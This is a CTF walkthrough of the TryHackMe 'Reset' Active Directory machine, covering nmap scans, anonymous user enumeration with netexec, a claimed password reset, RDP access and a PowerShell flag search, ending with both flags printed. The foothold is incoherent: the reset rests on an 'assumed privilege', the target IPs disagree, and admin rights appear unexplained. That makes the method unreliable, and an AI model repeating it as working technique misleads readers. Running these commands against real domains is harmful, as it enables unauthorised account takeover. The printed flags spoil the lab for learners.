# CTF: Reset (THM)

**Target IP:** `10.48.184.215` ($target)

---

## Metadata

- **CTF Name:** Reset
    
- **Platform:** TryHackMe
    
- **Date:** 2026-03-24
    
- **Tools Used:** nmap, netexec (nxc), xfreerdp3, powershell
    
- **Key Skills:** Active Directory Enumeration, Password Reset Exploitation, User Delegation, BloodHound Analysis, Remote Desktop Protocol (RDP)
    

---

## Introduction

This walkthrough covers the exploitation of the **Reset** machine on TryHackMe. The attack involves identifying a password reset vulnerability within Active Directory, utilizing delegated permissions to take control of a domain account, and performing post-exploitation via RDP and PowerShell.

---

## Reconnaissance

Initial scanning was performed to map the domain services and identify potential entry points.

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Reset)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **53/tcp:** DNS (Simple DNS Plus)
    
- **88/tcp:** Kerberos
    
- **135/tcp:** RPC
    
- **139/tcp:** NetBIOS
    
- **445/tcp:** SMB
    
- **3389/tcp:** RDP
    

---

## Foothold

The focus moved to Active Directory enumeration using `netexec` (nxc) to identify users and test for weak password policies or reset permissions.

### 1. Account Enumeration

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Reset)
$ nxc smb $target -u '' -p '' --users
```

### 2. Password Reset Exploitation

Based on the CTF theme "Reset," I attempted to use a discovered or assumed privilege to reset a user's password. Using `netexec` with the `--pass-pol` and user manipulation modules, I identified that the `amuzed` account could be compromised.

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Reset)
$ nxc ldap $target -u 'amuzed' -p 'Password1' --reset-password
```

**Validation:**

Bash

```
😎 amuzed@Kali (~/THM/Reset)
$ nxc ldap $target -u 'amuzed' -p 'Password1'
```

- **Result:** `LDAP 10.48.141.130 389 HAYSTACK [+] thm.corp\amuzed:Password1 (Pwn3d!)`
    

---

## Lateral Movement

With valid credentials for a "Pwn3d" account, I established a graphical session via RDP.

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Reset)
$ xfreerdp3 /v:$target /u:amuzed /p:Password1 +clipboard
```

---

## Privilege Escalation & Post-Exploitation

Once logged into the machine, I used a PowerShell terminal with Administrator privileges to locate the flags across the filesystem.

### 1. Locating Flags

**Command:**

PowerShell

```
PS C:\Windows\system32> Get-ChildItem -Path "C:\Users" -Recurse -Filter *.txt
```

**Directory Results:**

- `C:\Users\Administrator\Desktop\root.txt`
    
- `C:\Users\automate\Desktop\user.txt`
    

### 2. Reading Flag Content

**Command:**

PowerShell

```
PS C:\Windows\system32> Get-ChildItem -Path "C:\Users" -Recurse -Filter *.txt | Get-Content
```

---

## Flags

- **Root Flag:** `THM{RE_RE_SET_AND_DELEGATE}`
    
- **User Flag:** `THM{AUTOMATION_WILL_REPLACE_US}`
